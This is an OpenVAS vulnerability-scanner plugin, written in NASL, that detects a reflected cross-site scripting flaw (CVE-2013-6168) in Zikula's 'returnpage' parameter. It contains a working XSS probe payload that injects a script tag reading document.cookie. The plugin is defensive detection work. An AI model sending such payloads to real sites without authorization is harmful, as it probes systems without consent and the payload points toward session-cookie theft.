###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zikula_returnpage_xss_vuln.nasl 75 2013-11-22 14:32:56Z veerendragg $
#
# Zikula returnpage Cross Site Scripting Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803962";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 75 $");
  script_cve_id("CVE-2013-6168");
  script_bugtraq_id(63186);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-11-22 15:32:56 +0100 (Fri, 22 Nov 2013) $");
  script_tag(name:"creation_date", value:"2013-11-15 17:56:51 +0530 (Fri, 15 Nov 2013)");
  script_name("Zikula returnpage Cross Site Scripting Vulnerability");

  tag_summary =
"This host is installed with Zikula and is prone to cross-site scripting
vulnerability.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether
it is able to read the string or not.";

  tag_insight =
"An error exists in the index.php script which fails to properly sanitize
user-supplied input to 'returnpage' parameter.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML
script code in a user's browser session in the context of an affected site.

Impact Level: Application";

  tag_affected =
"Zikula Application Framework version prior to 1.3.6 build 19";

  tag_solution =
"Upgrade to Zikula Application Framework version to 1.3.6 build 19 or later,
For updates refer to http://zikula.org";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "summary" , value : tag_summary);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/88654");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/124009");
  script_summary("Check if Zikula is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
req = "";
res = "";
url = "";
match = "";
rurl = "/index.php";

## Get HTTP Port
http_port = get_http_port(default:80);
if(!http_port){
  http_port = 80 ;
}

## Check the port status
if(!get_port_state(http_port)){
  exit(0);
}

if(!can_host_php(port:http_port)){
  exit(0);
}

## check the possible paths
foreach dir (make_list("", "/zikula", "/framework", "/Zikula_Core", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir, rurl), port:http_port);
  res = http_keepalive_send_recv(port:http_port, data:req);

  ## Confirm the application
  if(res && (egrep(pattern:"Powered by .*Zikula", string:res)) && "User log-in" >< res)
  {
    ## Construct the attack request
    url = dir + rurl + "?module=users&type=user&func=login&returnpage=" +
            "%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E";
    match = "<script>alert\(document.cookie\);</script>";

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE, pattern:match))
    {
      security_warning(http_port);
      exit(0);
    }
  }
}
